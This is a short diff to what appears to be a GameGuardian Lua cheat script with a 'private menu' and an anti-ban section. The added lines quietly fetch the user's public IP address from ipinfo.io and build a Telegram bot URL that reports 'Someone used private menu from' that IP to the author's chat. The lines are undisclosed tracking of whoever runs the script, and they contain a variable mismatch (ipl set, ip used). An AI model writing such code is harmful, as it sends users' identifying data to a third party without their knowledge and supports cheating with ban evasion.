@@ -1,6 +1,10 @@
 Y = "『✴️』"
 dadissue = ""
 
+ipl = gg.makeRequest("https://ipinfo.io/ip").content
+if not ipl then gg.alert("『✴️』Check your internet connection!") os.exit() end
+tlink = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..user.."&parse_mode=html&text=Someone used private menu from: "..ip..""
+
 Map = {
       Functions = {
         AntiBan = {
